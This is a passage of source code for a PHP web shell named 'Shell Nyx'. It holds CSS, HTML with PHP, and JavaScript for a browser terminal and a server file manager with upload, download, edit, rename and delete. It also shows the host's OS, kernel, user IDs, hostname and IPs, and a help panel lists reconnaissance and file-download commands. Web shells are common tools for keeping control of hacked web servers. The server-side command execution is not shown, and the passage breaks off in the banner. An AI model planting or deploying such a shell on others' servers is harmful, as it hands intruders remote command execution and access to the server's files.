    .file-manager { display: flex; flex-direction: column; height: 100%; }
    
    .fm-toolbar {
        display: flex;
        gap: clamp(4px, 0.8vw, 10px);
        margin-bottom: clamp(8px, 1.5vh, 15px);
        flex-wrap: wrap;
        align-items: center;
        flex-shrink: 0;
    }
    
    .fm-toolbar button, .fm-toolbar input {
        padding: clamp(6px, 0.8vh, 12px) clamp(8px, 1.2vw, 18px);
        background: var(--panel-bg);
        border: 1px solid var(--border);
        color: var(--text);
        font-family: inherit;
        cursor: pointer;
        border-radius: 3px;
        transition: all 0.3s;
        font-size: clamp(11px, 0.9vw, 15px);
        white-space: nowrap;
    }
    
    .fm-toolbar button:hover { background: var(--hover); border-color: var(--green); }
    #fm-path { flex: 1; min-width: 120px; padding: clamp(6px, 0.8vh, 12px); font-size: clamp(11px, 0.9vw, 15px); }
    #fm-search { min-width: 100px; padding: clamp(6px, 0.8vh, 12px); font-size: clamp(11px, 0.9vw, 15px); border-color: var(--cyan); color: var(--cyan); }
    #fm-search::placeholder { color: rgba(0, 212, 255, 0.5); }
    
    .fm-table-wrapper {
        overflow: auto;
        flex: 1;
        border: 1px solid var(--border);
        border-radius: 5px;
        min-height: 150px;
    }
    
    .fm-table-wrapper.drag-over {
        border-color: var(--green);
        box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
        background: rgba(0, 255, 65, 0.05);
    }
    
    #fm-table { width: 100%; border-collapse: collapse; background: var(--panel-bg); font-size: clamp(10px, 0.9vw, 14px); table-layout: fixed; }
    #fm-table th {
        background: var(--hover);
        color: var(--green);
        padding: clamp(6px, 1vh, 12px) clamp(5px, 0.8vw, 10px);
        text-align: left;
        border: 1px solid var(--border);
        position: sticky; top: 0; z-index: 10;
        font-size: clamp(9px, 0.8vw, 13px);
        text-transform: uppercase;
        letter-spacing: 1px;
        user-select: none;
        white-space: nowrap;
    }
    #fm-table td {
        padding: clamp(6px, 1vh, 12px) clamp(5px, 0.8vw, 10px);
        border: 1px solid var(--border);
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
    }
    #fm-table tr:hover { background: var(--hover); }
    
    /* Column widths for file table */
    #fm-table th:nth-child(1), #fm-table td:nth-child(1) { width: 35%; } /* Name */
    #fm-table th:nth-child(2), #fm-table td:nth-child(2) { width: 10%; } /* Size */
    #fm-table th:nth-child(3), #fm-table td:nth-child(3) { width: 10%; } /* Permissions */
    #fm-table th:nth-child(4), #fm-table td:nth-child(4) { width: 20%; } /* Modified */
    #fm-table th:nth-child(5), #fm-table td:nth-child(5) { width: 25%; } /* Actions */
    
    .dir { color: var(--blue); cursor: pointer; font-weight: bold; font-size: inherit; }
    .dir:hover { text-decoration: underline; }
    .file { color: var(--text); font-size: inherit; }
    .download-link { color: var(--cyan); text-decoration: none; cursor: pointer; font-size: inherit; }
    .download-link:hover { text-decoration: underline; color: var(--green); }
    
    /* ----- Buttons ----- */
    .btn {
        padding: clamp(4px, 0.5vh, 8px) clamp(6px, 1vw, 14px);
        background: var(--panel-bg);
        border: 1px solid var(--border);
        color: var(--text);
        cursor: pointer;
        font-family: inherit;
        border-radius: 5px;
        transition: all 0.3s;
        font-size: clamp(10px, 0.8vw, 14px);
        min-width: clamp(28px, 3vw, 40px);
        margin: 1px;
        white-space: nowrap;
    }
    .btn:hover { background: var(--hover); border-color: var(--green); }
    .btn-danger { border-color: var(--red); color: var(--red); }
    .btn-danger:hover { background: var(--red); color: var(--bg); }
    .btn-download { border-color: var(--cyan); color: var(--cyan); }
    .btn-download:hover { background: var(--cyan); color: var(--bg); }
    .btn:disabled { opacity: 0.3; cursor: not-allowed; }
    .btn:disabled:hover { background: var(--panel-bg); border-color: var(--border); }
    
    .file-count {
        color: var(--cyan);
        font-size: clamp(10px, 0.8vw, 14px);
        padding: clamp(6px, 0.8vh, 12px) clamp(8px, 1.2vw, 18px);
        background: var(--panel-bg);
        border: 1px solid var(--cyan);
        border-radius: 3px;
        white-space: nowrap;
        margin-left: auto;
    }
    
    #load-more-container { text-align: center; padding: clamp(8px, 1.5vh, 15px); background: var(--panel-bg); border-top: 1px solid var(--border); }
    #load-more-btn {
        padding: clamp(8px, 1vh, 12px) clamp(20px, 3vw, 35px);
        background: var(--bg);
        border: 1px solid var(--green);
        color: var(--green);
        cursor: pointer;
        border-radius: 5px;
        font-family: inherit;
        font-size: clamp(11px, 1vw, 15px);
        transition: all 0.3s;
    }
    #load-more-btn:hover { background: var(--green); color: var(--bg); }
    #load-more-btn:disabled { opacity: 0.3; cursor: not-allowed; }
    
    /* ----- Custom Scrollbars ----- */
    ::-webkit-scrollbar { width: clamp(4px, 0.8vw, 10px); height: clamp(4px, 0.8vw, 10px); }
    ::-webkit-scrollbar-track { background: var(--bg); }
    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 5px; }
    ::-webkit-scrollbar-thumb:hover { background: #555; }
    
    /* ====== FOOTER ====== */
    #footer {
        background: var(--panel-bg);
        padding: clamp(6px, 0.8vh, 14px) clamp(10px, 1.5vw, 20px);
        border-top: 2px solid var(--purple);
        display: flex;
        justify-content: center;
        align-items: center;
        flex-shrink: 0; /* Never shrink footer */
        box-shadow: 0 0 20px rgba(170, 68, 255, 0.1);
    }
    
    #footer-credit {
        color: var(--purple);
        font-size: clamp(10px, 0.9vw, 14px);
        letter-spacing: clamp(1px, 0.3vw, 3px);
        text-shadow: 0 0 10px rgba(170, 68, 255, 0.5);
        white-space: nowrap;
    }
    
    /* ====== HELP PANEL ====== */
    .help-container { overflow-y: auto; flex: 1; padding: clamp(10px, 2vw, 20px); }
    .help-section { background: var(--panel-bg); border: 1px solid var(--border); border-radius: 8px; padding: clamp(10px, 2vw, 20px); margin-bottom: clamp(10px, 2vh, 20px); }
    .help-section h2 { color: var(--green); font-size: clamp(14px, 1.5vw, 20px); margin-bottom: 15px; padding-bottom: 10px; border-bottom: 1px solid var(--border); }
    .help-section h3 { color: var(--cyan); font-size: clamp(12px, 1.2vw, 16px); margin: 15px 0 10px 0; }
    .help-section p { margin: 8px 0; line-height: 1.6; font-size: clamp(11px, 0.9vw, 15px); }
    .help-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: clamp(8px, 1.5vw, 15px); }
    .help-card { background: var(--bg); border: 1px solid var(--border); border-radius: 5px; padding: clamp(8px, 1.5vw, 15px); }
    .help-card h4 { color: var(--yellow); margin-bottom: 10px; font-size: clamp(11px, 1vw, 14px); }
    .help-card code { background: #1a1a2e; color: var(--green); padding: 3px 8px; border-radius: 3px; font-size: clamp(10px, 0.8vw, 13px); display: inline-block; margin: 3px 0; }
    .help-card pre { background: #1a1a2e; padding: clamp(6px, 1vw, 12px); border-radius: 5px; overflow-x: auto; margin: 8px 0; font-size: clamp(10px, 0.8vw, 13px); line-height: 1.4; }
    .help-card pre code { background: none; padding: 0; }
    
    .feature-badge { display: inline-block; padding: 4px 10px; border-radius: 12px; font-size: clamp(9px, 0.8vw, 12px); margin: 3px; background: var(--hover); border: 1px solid var(--border); }
    .feature-badge.green { border-color: var(--green); color: var(--green); }
    .feature-badge.cyan { border-color: var(--cyan); color: var(--cyan); }
    .feature-badge.yellow { border-color: var(--yellow); color: var(--yellow); }
    .feature-badge.purple { border-color: var(--purple); color: var(--purple); }
    
    .search-highlight { background: rgba(255, 170, 0, 0.3); padding: 1px 2px; border-radius: 2px; }
    
    /* ====== RESPONSIVE BREAKPOINTS ====== */
    @media (max-width: 1024px) {
        #header-left { min-width: 30px; }
        #fm-path { min-width: 100px; }
        #fm-search { min-width: 80px; }
        #header-center { padding-left: 150px; }
    }
    
    @media (max-width: 768px) {
        #header { flex-direction: column; gap: 4px; padding: 6px 8px; }
        #header-left { display: none; }
        #header-center { order: -1; width: 100%; padding-left: 0; }
        #system-info { justify-content: center; gap: 4px; }
        .sys-info-label { display: none; }
        .sys-info-icon { font-size: clamp(14px, 3vw, 18px); }
        .tab { padding: 8px 12px; font-size: 12px; }
        .fm-toolbar { gap: 4px; }
        .fm-toolbar button, .fm-toolbar input { padding: 6px 10px; font-size: 12px; }
        #fm-table th:nth-child(3), #fm-table td:nth-child(3) { display: none; }
        #fm-table th:nth-child(1), #fm-table td:nth-child(1) { width: 40%; }
        #fm-table th:nth-child(2), #fm-table td:nth-child(2) { width: 15%; }
        #fm-table th:nth-child(4), #fm-table td:nth-child(4) { width: 25%; }
        #fm-table th:nth-child(5), #fm-table td:nth-child(5) { width: 20%; }
    }
    
    @media (max-width: 480px) {
        body { font-size: 13px; }
        #header h1 { font-size: 16px; letter-spacing: 1px; }
        .sys-info-item { padding: 2px 4px; font-size: 9px; }
        .tab { padding: 6px 10px; font-size: 11px; letter-spacing: 0.5px; }
        .panel { padding: 5px; }
        #terminal-output { padding: 6px; font-size: 11px; min-height: 80px; }
        #terminal-input-line { padding: 5px 6px; }
        .fm-toolbar { flex-direction: column; gap: 3px; }
        #fm-path, #fm-search { min-width: 100%; width: 100%; }
        .fm-toolbar button { width: 100%; text-align: center; }
        #fm-table th:nth-child(4), #fm-table td:nth-child(4) { display: none; }
        #fm-table th:nth-child(1), #fm-table td:nth-child(1) { width: 45%; }
        #fm-table th:nth-child(2), #fm-table td:nth-child(2) { width: 15%; }
        #fm-table th:nth-child(5), #fm-table td:nth-child(5) { width: 40%; }
        .btn { padding: 3px 6px; font-size: 10px; min-width: 22px; }
        #footer-credit { font-size: 10px; letter-spacing: 1px; }
        .help-grid { grid-template-columns: 1fr; }
        .file-count { font-size: 10px; padding: 4px 6px; }
    }
    
    @media (max-width: 360px) {
        #header h1 { font-size: 14px; }
        .sys-info-item { padding: 1px 3px; font-size: 8px; gap: 2px; }
        .tab { padding: 5px 8px; font-size: 10px; }
        #terminal-output { font-size: 10px; min-height: 60px; }
        #fm-table { font-size: 9px; }
        #fm-table th, #fm-table td { padding: 4px 2px; }
        .btn { padding: 2px 4px; font-size: 9px; min-width: 18px; }
        #footer { padding: 4px 6px; }
        #footer-credit { font-size: 9px; }
    }
</style>
</head>
<body>
    <!-- ====== HEADER ====== -->
    <div id="header">
        <div id="header-left"></div>
        <div id="header-center">
            <h1>🐚 Shell Nyx 🐚</h1>
        </div>
        
        <!-- System Info Icons (OS, Username, Hostname) -->
        <div id="system-info">
            <!-- OS Detection Badge -->
            <div class="sys-info-item os-<?= htmlspecialchars($osInfo['os']) ?>" id="sys-os">
                <span class="sys-info-icon" id="sys-os-icon"><?= $osInfo['icon'] ?></span>
                <span class="sys-info-label" id="sys-os-label"><?= htmlspecialchars($osInfo['name']) ?></span>
                <div class="tooltip">
                    <div class="tooltip-title">💻 Operating System</div>
                    <div class="tooltip-row"><span class="label">Detected:</span><span class="value" id="tooltip-os-name"><?= htmlspecialchars($osInfo['name']) ?></span></div>
                    <div class="tooltip-row"><span class="label">PHP_OS:</span><span class="value" id="tooltip-php-os"><?= htmlspecialchars(PHP_OS) ?></span></div>
                    <div class="tooltip-row"><span class="label">Kernel:</span><span class="value" id="tooltip-kernel"><?= htmlspecialchars(php_uname('s') . ' ' . php_uname('r')) ?></span></div>
                    <div class="tooltip-row"><span class="label">Architecture:</span><span class="value" id="tooltip-arch"><?= htmlspecialchars(php_uname('m')) ?></span></div>
                </div>
            </div>
            
            <!-- Username Badge -->
            <div class="sys-info-item" id="sys-username">
                <span class="sys-info-icon">👤</span>
                <span class="sys-info-label" id="sys-username-label"><?= htmlspecialchars($initialUsername) ?></span>
                <div class="tooltip">
                    <div class="tooltip-title">👤 Current User</div>
                    <div class="tooltip-row"><span class="label">Username:</span><span class="value" id="tooltip-username"><?= htmlspecialchars($initialUsername) ?></span></div>
                    <div class="tooltip-row"><span class="label">UID/GID:</span><span class="value" id="tooltip-uid"><?= function_exists('posix_geteuid') ? posix_geteuid() . '/' . posix_getegid() : 'N/A' ?></span></div>
                </div>
            </div>
            
            <!-- Hostname Badge -->
            <div class="sys-info-item" id="sys-hostname">
                <span class="sys-info-icon">🌐</span>
                <span class="sys-info-label" id="sys-hostname-label"><?= htmlspecialchars($initialHostnameInfo['hostname']) ?></span>
                <div class="tooltip">
                    <div class="tooltip-title">🌐 Hostname & Network</div>
                    <div class="tooltip-row"><span class="label">Hostname:</span><span class="value" id="tooltip-hostname"><?= htmlspecialchars($initialHostnameInfo['hostname']) ?></span></div>
                    <?php if (!empty($initialHostnameInfo['ips'])): ?>
                    <div class="tooltip-ip-list">
                        <div class="tooltip-row"><span class="label">IP Addresses:</span></div>
                        <?php foreach ($initialHostnameInfo['ips'] as $ip): ?>
                        <div class="tooltip-ip-item">🔹 <?= htmlspecialchars($ip) ?></div>
                        <?php endforeach; ?>
                    </div>
                    <?php else: ?>
                    <div class="tooltip-row"><span class="label">IP:</span><span class="value">Not detected</span></div>
                    <?php endif; ?>
                </div>
            </div>
        </div>
    </div>
    
    <!-- ====== TABS ====== -->
    <div id="tabs">
        <button class="tab active" onclick="switchTab('terminal')">💻 Terminal</button>
        <button class="tab" onclick="switchTab('files')">📁 File Manager</button>
        <button class="tab" onclick="switchTab('help')">ℹ️ Help</button>
    </div>
    
    <!-- ====== MAIN CONTENT ====== -->
    <div id="content">
        <!-- Terminal Panel -->
        <div id="panel-terminal" class="panel active">
            <div id="terminal-output"></div>
            <div id="terminal-input-line">
		<span id="terminal-prompt"><?= ($osInfo['os'] === 'windows' ? (preg_match('/^([A-Za-z]):/', $initialCwd, $m) ? $m[1] . ':\\' : 'C:\\') : '/') . $promptSymbol ?> </span>
		<input type="text" id="terminal-input" autofocus autocomplete="off" spellcheck="false">
            </div>
        </div>
        
        <!-- File Manager Panel -->
        <div id="panel-files" class="panel">
            <div class="file-manager">
                <div class="fm-toolbar">
                    <input type="text" id="fm-path" placeholder="Enter path and press Enter" value="<?= htmlspecialchars($initialCwd) ?>" onkeypress="if(event.key==='Enter') fmRefresh()">
                    <input type="text" id="fm-search" placeholder="🔍 Search files..." oninput="fmSearchDebounced()">
                    <button onclick="fmRefresh('/')" title="Go to root directory">🏠 Root</button>
                    <button onclick="fmGoBack()" title="Go back one directory">⬅ Back</button>
                    <button onclick="fmNewFolder()" title="Create new folder">📁 New Folder</button>
                    <button onclick="fmUploadFile()" title="Upload file">📤 Upload</button>
                    <span id="file-count" class="file-count">0 files</span>
                    <input type="file" id="fm-upload-input" style="display:none" multiple onchange="fmHandleUpload(this)">
                </div>
                <div class="fm-table-wrapper" id="fm-drop-zone">
                    <table id="fm-table">
                        <thead>
                            <tr><th>Name</th><th>Size</th><th>Permissions</th><th>Modified</th><th>Actions</th></tr>
                        </thead>
                        <tbody id="fm-tbody">
                            <tr><td colspan="5" style="text-align:center;color:#888;">Loading...</td></tr>
                        </tbody>
                    </table>
                    <div id="load-more-container" style="display:none;">
                        <button id="load-more-btn" onclick="loadMoreFiles()">Load More</button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Help Panel -->
        <div id="panel-help" class="panel">
            <div class="help-container">
                <div class="help-section">
                    <h2>📋 Shell Nyx - Quick Overview</h2>
                    <p>Shell Nyx is a <span class="feature-badge green">Powerful</span> web-based shell, built with passion by Zent01.💙</p>
                    <div class="help-grid" style="margin-top:15px;">
                        <div class="help-card">
                            <h4>⌨️ Keyboard Shortcuts</h4>
                            <p><code>Ctrl+1</code> Switch to Terminal</p>
                            <p><code>Ctrl+2</code> Switch to File Manager</p>
                            <p><code>Ctrl+3</code> Switch to Help</p>
                            <p><code>Ctrl+F</code> Focus search (File Manager)</p>
                            <p><code>Tab</code> Auto-complete in terminal</p>
                            <p><code>↑/↓</code> Command history</p>
                            <p><code>Enter</code> Execute command / Open folder</p>
                        </div>
                    </div>
                </div>
                <div class="help-section">
                    <h2>💻 Terminal Usage</h2>
                    <div class="help-grid">
                        <div class="help-card">
                            <h4>Basic Commands</h4>
                            <pre><code># Navigation
cd /path/to/dir     # Change directory
cd ~                # Go to home
pwd                 # Show current path

# File Operations
ls                  # List files (Linux)
dir                 # List files (Windows)
cat file.txt        # View file
type file.txt       # View file (Windows)</code></pre>
                        </div>
                        <div class="help-card">
                            <h4>System Commands</h4>
                            <pre><code># System Info
whoami              # Current user
uname -a            # System info (Linux)
systeminfo          # System info (Windows)
ps aux              # Process list
tasklist            # Process list (Windows)

# Network
ifconfig            # Network info (Linux)
ipconfig            # Network info (Windows)
netstat -an         # Network connections
curl url            # HTTP requests</code></pre>
                        </div>
                        <div class="help-card">
                            <h4>PowerShell (Windows)</h4>
                            <pre><code>powershell Get-ChildItem -Path "C:\Users"
powershell Get-Process
powershell Get-Service
powershell Get-Content file.txt</code></pre>
                        </div>
                        <div class="help-card">
                            <h4>Advanced Examples</h4>
                            <pre><code># Find files
find / -name "*.php"
findstr /s "search" *.txt

# Download files
wget http://example.com/file
curl -O http://example.com/file

# Scripting
python script.py
php -r "echo 'test';"
bash script.sh</code></pre>
                        </div>
                    </div>
                </div>
                <div class="help-section">
                    <h2>📁 File Manager Features</h2>
                    <div class="help-grid">
                        <div class="help-card">
                            <h4>🗂️ Navigation</h4>
                            <p><span class="feature-badge cyan">Click 👆</span> on folders to navigate</p>
                            <p><span class="feature-badge green">Path bar 📍</span> shows current location</p>
                            <p><span class="feature-badge yellow">Back button ⬅️</span> goes up one level</p>
                            <p><span class="feature-badge purple">Root button 🌱</span> goes to filesystem root</p>
                        </div>
                        <div class="help-card">
                            <h4>📤 Upload Files</h4>
                            <p><span class="feature-badge green">Drag & Drop 📦</span> files anywhere on the table</p>
                            <p><span class="feature-badge cyan">Upload button 📤</span> opens file selector</p>
                            <p><span class="feature-badge yellow">Multiple files 📂</span> supported</p>
                        </div>
                        <div class="help-card">
                            <h4>⚡ File Actions</h4>
                            <p><span class="feature-badge green">📥 Download</span> - Click file name or 📥 button</p>
                            <p><span class="feature-badge cyan">✏️ Edit</span> - Edit text files inline</p>
                            <p><span class="feature-badge yellow">🔤 Rename</span> - Rename files/folders</p>
                            <p><span class="feature-badge purple">🗑 Delete</span> - Delete with confirmation</p>
                            <p><span class="feature-badge green">📁 New Folder</span> - Create directory</p>
                        </div>
                        <div class="help-card">
                            <h4>🔍 Search & Filter</h4>
                            <p><span class="feature-badge cyan">Real-time search 🔎</span> filters files as you type</p>
                            <p><span class="feature-badge yellow">Highlighted matches ✨</span> in file names</p>
                            <p><span class="feature-badge purple">Case-insensitive 👍</span> search</p>
                            <p><span class="feature-badge green">Instant results ⚡</span> with 300ms debounce</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- ====== FOOTER ====== -->
    <div id="footer">
        <span id="footer-credit">✦ Created by Zent01 ✦</span>
    </div>

    <script>
    
        // ====== GLOBAL VARIABLES ======
        const OS_TYPE = '<?= $osInfo['os'] ?>';  // OS type from PHP: 'windows', 'linux', or 'macos'
        
        // Current working directory (stored in sessionStorage for persistence)
        let cwd = sessionStorage.getItem('shellNyxCwd') || '<?= addslashes($initialCwd) ?>';
        cwd = normalizePath(cwd);
        
        // Terminal history for up/down arrow navigation
        let commandHistory = [];
        let historyIndex = -1;
        
        // File manager state
        let currentFileList = [];   // Currently displayed files
        let currentOffset = 0;      // Pagination offset
        let totalFiles = 0;         // Total files in current directory
        let hasMoreFiles = false;   // Whether there are more files to load
        let currentSearch = '';     // Current search term
        const LOAD_LIMIT = 100;     // Files per page
        
        // Debounce timers for performance
        let searchDebounceTimer = null;
        let resizeDebounceTimer = null;
        let scrollDebounceTimer = null;
        
        // Virtual scroll parameters (for large file lists)
        let visibleRange = { start: 0, end: LOAD_LIMIT };
        let rowHeight = 40;
        let containerHeight = 0;
        let isScrolling = false;
        
        // DOM element references (cached for performance)
        const terminalInput = document.getElementById('terminal-input');
        const terminalOutput = document.getElementById('terminal-output');
        const terminalPrompt = document.getElementById('terminal-prompt');
        const fmPath = document.getElementById('fm-path');
        const fmSearch = document.getElementById('fm-search');
        const fmTbody = document.getElementById('fm-tbody');
        const fmDropZone = document.getElementById('fm-drop-zone');
        const loadMoreContainer = document.getElementById('load-more-container');
        const loadMoreBtn = document.getElementById('load-more-btn');
        const fileCount = document.getElementById('file-count');
        
        // ====== SYSTEM INFO REFRESH ======
        
        /** 
         * Periodically refresh system info icons (OS, username, hostname)
         * Runs every 30 seconds via AJAX
         */
        function refreshSystemInfo() {
            fetch('?feature=systeminfo')
                .then(r => r.json())
                .then(data => {
                    if (data.success) {
                        // Update OS badge
                        document.getElementById('sys-os').className = 'sys-info-item os-' + data.os.os;
                        document.getElementById('sys-os-icon').textContent = data.os.icon;
                        document.getElementById('sys-os-label').textContent = data.os.name;
                        document.getElementById('tooltip-os-name').textContent = data.os.name;
                        document.getElementById('tooltip-php-os').textContent = '<?= addslashes(PHP_OS) ?>';
                        
                        // Update username badge
                        document.getElementById('sys-username-label').textContent = data.username;
                        document.getElementById('tooltip-username').textContent = data.username;
                        
                        // Update hostname badge
                        document.getElementById('sys-hostname-label').textContent = data.hostname;
                        document.getElementById('tooltip-hostname').textContent = data.hostname;
                        
                        // Update IP list in hostname tooltip
                        const tooltipIpList = document.querySelector('#sys-hostname .tooltip-ip-list');
                        if (tooltipIpList) {
                            if (data.ips && data.ips.length > 0) {
                                tooltipIpList.innerHTML = `<div class="tooltip-row"><span class="label">IP Addresses:</span></div>${data.ips.map(ip => `<div class="tooltip-ip-item">🔹 ${escapeHtml(ip)}</div>`).join('')}`;
                            } else {
                                tooltipIpList.innerHTML = `<div class="tooltip-row"><span class="label">IP:</span><span class="value">Not detected</span></div>`;
                            }
                        }
                    }
                })
                .catch(err => console.error('System info refresh failed:', err));
        }
        
        setInterval(refreshSystemInfo, 30000);  // Refresh every 30 seconds
 
        // ====== UTILITY FUNCTIONS ======
        
        /** Save current working directory to sessionStorage for persistence */
        function saveCwd(newCwd) {
            cwd = normalizePath(newCwd);
            sessionStorage.setItem('shellNyxCwd', cwd);
        }
        
        /** 
         * Normalize path: convert backslashes to forward slashes, 
         * remove double slashes, remove trailing slash (except root)
         */
        function normalizePath(path) {
            if (!path) return '/';
            path = path.replace(/\\/g, '/');
            path = path.replace(/\/+/g, '/');
            if (path.length > 1 && path.endsWith('/')) path = path.slice(0, -1);
            return path;
        }
        
        /** Format bytes to human-readable string (e.g., "1.5 MB") */
        function formatBytes(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }
        
        /** Escape HTML special characters to prevent XSS attacks */
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        /** Highlight search matches in text with a colored background */
        function highlightSearch(text, searchTerm) {
            if (!searchTerm || searchTerm.length < 1) return escapeHtml(text);
            const regex = new RegExp('(' + searchTerm.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'gi');
            return escapeHtml(text).replace(regex, '<span class="search-highlight">$1</span>');
        }
        
        /** Generate download URL for a file */
        function getDownloadUrl(path) {
            return '?feature=download&path=' + encodeURIComponent(path);
        }
        
        // ====== DEBOUNCED EVENT HANDLERS (prevent excessive calls) ======
        
        /** Debounced search - waits 300ms after user stops typing */
        function fmSearchDebounced() {
            clearTimeout(searchDebounceTimer);
            searchDebounceTimer = setTimeout(() => {
                currentSearch = fmSearch.value.trim();
                fmRefresh(fmPath.value);
            }, 300);
        }
        
        /** Debounced resize handler */
        function handleResizeDebounced() {
            clearTimeout(resizeDebounceTimer);
            resizeDebounceTimer = setTimeout(() => {
                updateVirtualScrollParams();
                renderVisibleFiles();
            }, 150);
        }
        
        /** Debounced scroll handler for virtual scrolling */
        function handleScrollDebounced() {
            if (isScrolling) return;
            isScrolling = true;
            clearTimeout(scrollDebounceTimer);
            scrollDebounceTimer = setTimeout(() => {
                isScrolling = false;
                checkVirtualScroll();
            }, 100);
        }
        
        // ====== VIRTUAL SCROLL (renders only visible rows for performance) ======
        
        function updateVirtualScrollParams() {
            const wrapper = fmDropZone;
            if (wrapper) {
                containerHeight = wrapper.clientHeight;
                const firstRow = fmTbody.querySelector('tr');
                if (firstRow) rowHeight = firstRow.offsetHeight || 40;
            }
        }
        
        /** Calculate which rows should be visible based on scroll position */
        function getVisibleRange() {
            const wrapper = fmDropZone;
            if (!wrapper) return { start: 0, end: LOAD_LIMIT };
            const scrollTop = wrapper.scrollTop;
            const start = Math.max(0, Math.floor(scrollTop / rowHeight) - 5);
            const end = Math.min(currentFileList.length, Math.ceil((scrollTop + containerHeight) / rowHeight) + 5);
            return { start, end };
        }
        
        /** Check if we need to load more files or render new visible range */
        function checkVirtualScroll() {
            if (currentFileList.length === 0) return;
            const range = getVisibleRange();
            // Load more files when nearing the end
            if (range.end >= currentFileList.length - 10 && hasMoreFiles) loadMoreFiles();
            // Re-render if visible range changed significantly
            if (Math.abs(range.start - visibleRange.start) > 10 || Math.abs(range.end - visibleRange.end) > 10) {
                visibleRange = range;
                renderVisibleFiles();
            }
        }
        
        /** Render only the rows that are currently visible in the viewport */
        function renderVisibleFiles() {
            if (currentFileList.length === 0) {
                fmTbody.innerHTML = '<tr><td colspan="5" style="text-align:center;color:#888;padding:20px;">No files found</td></tr>';
                return;
            }
            
            const range = getVisibleRange();
            visibleRange = range;
            
            let html = '';
            // Add spacer row above visible range
            if (range.start > 0) html += `<tr style="height:${range.start * rowHeight}px;"><td colspan="5"></td></tr>`;
            
            // Render visible rows
            for (let i = range.start; i < Math.min(range.end, currentFileList.length); i++) {
                const file = currentFileList[i];
                const icon = file.type === 'dir' ? '📁' : '📄';
                const sizeStr = file.type === 'dir' ? '-' : formatBytes(file.size);
                const safePath = escapeHtml(normalizePath(file.path));
                const highlightedName = highlightSearch(file.name, currentSearch);
                
                let nameCell = '';
                if (file.type === 'dir') {
                    nameCell = `<span class="dir" data-path="${safePath}" style="cursor:pointer;">${icon} ${highlightedName}</span>`;
                } else {
                    const downloadUrl = getDownloadUrl(file.path);
                    nameCell = `<span class="file">${icon}</span> <a href="${downloadUrl}" class="download-link" title="Download ${escapeHtml(file.name)}" onclick="event.stopPropagation();">${highlightedName}</a>`;
                }
                
                html += `<tr>
                    <td>${nameCell}</td><td>${sizeStr}</td><td>${file.perms}</td><td>${file.modified}</td>
                    <td>
                        <button class="btn btn-download fm-download" data-path="${safePath}" ${file.type === 'dir' ? 'disabled' : ''}>📥</button>
                        <button class="btn btn-danger fm-delete" data-path="${safePath}">🗑</button>
                        <button class="btn fm-edit" data-path="${safePath}" ${file.type === 'dir' ? 'disabled' : ''}>✏️</button>
                        <button class="btn fm-rename" data-path="${safePath}">🔤</button>
                    </td>
                </tr>`;
            }
            
            // Add spacer row below visible range
            if (range.end < currentFileList.length) {
                html += `<tr style="height:${(currentFileList.length - range.end) * rowHeight}px;"><td colspan="5"></td></tr>`;
            }
            
            requestAnimationFrame(() => { fmTbody.innerHTML = html; });
        }
        
        // ====== DRAG & DROP UPLOAD ======
        
        if (fmDropZone) {
            fmDropZone.addEventListener('dragover', function(e) {
                e.preventDefault(); e.stopPropagation();
                this.classList.add('drag-over');  // Highlight drop zone
            });
            fmDropZone.addEventListener('dragleave', function(e) {
                e.preventDefault(); e.stopPropagation();
                this.classList.remove('drag-over');
            });
            fmDropZone.addEventListener('drop', function(e) {
                e.preventDefault(); e.stopPropagation();
                this.classList.remove('drag-over');
                const files = e.dataTransfer.files;
                if (files.length > 0) uploadFilesWithProgress(files);
            });
            fmDropZone.addEventListener('scroll', handleScrollDebounced, { passive: true });
        }
        
        window.addEventListener('resize', handleResizeDebounced);
        
        /** Upload multiple files with progress logging to console */
        function uploadFilesWithProgress(files) {
            const totalFiles = files.length;
            let completedFiles = 0;
            let totalSize = 0;
            for (let i = 0; i < files.length; i++) totalSize += files[i].size;
            
            console.log(`Uploading ${totalFiles} files (${formatBytes(totalSize)})`);
            
            Array.from(files).forEach((file) => {
                const formData = new FormData();
                formData.append('file', file);
                formData.append('cwd', cwd);
                formData.append('path', normalizePath(fmPath.value + '/' + file.name));
                
                fetch('?feature=upload', { method: 'POST', body: formData })
                .then(r => r.json())
                .then(data => {
                    completedFiles++;
                    if (data.success) console.log(`Uploaded ${completedFiles}/${totalFiles} files`);
                    if (completedFiles >= totalFiles) { fmRefresh(); console.log('Upload complete: ' + formatBytes(totalSize)); }
                })
                .catch(err => { completedFiles++; if (completedFiles >= totalFiles) fmRefresh(); });
            });
        }
        
        // ====== TERMINAL OUTPUT FUNCTIONS ======
        
        /** Add a line to the terminal banner (green color) */
        function appendBannerLine(text) {
            const pre = document.createElement('pre');
            pre.style.color = '#00ff41'; pre.style.margin = '0'; pre.style.lineHeight = '1.2';
            pre.style.fontSize = '14px'; pre.style.textAlign = 'left'; pre.textContent = text;
            terminalOutput.appendChild(pre);
        }
        
        /** Add a centered credit line to the terminal banner (purple color) */
        function appendCreditLine(text) {
            const pre = document.createElement('pre');
            pre.style.color = '#aa44ff'; pre.style.margin = '0'; pre.style.fontSize = '16px';
            pre.style.letterSpacing = '2px';
            pre.textContent = ' '.repeat(Math.max(0, Math.floor((60 - text.length) / 2))) + text;
            terminalOutput.appendChild(pre);
        }
        
        // Display ASCII art banner on load
        appendBannerLine(' $$$$$$\\  $$\\                 $$\\ $$\\       $$\\   $$\\                     ');
        appendBannerLine('$$  __$$\\ $$ |                $$ |$$ |      $$$\\  $$ |                    ');
        appendBannerLine('$$ /  \\__|$$$$$$$\\   $$$$$$\\  $$ |$$ |      $$$$\\ $$ |$$\\   $$\\ $$\\   $$\\ ');
        appendBannerLine('\\$$$$$$\\  $$  __$$\\ $$  __$$\\ $$ |$$ |      $$ $$\\$$ |$$ |  $$ |\\$$\\ $$  |');
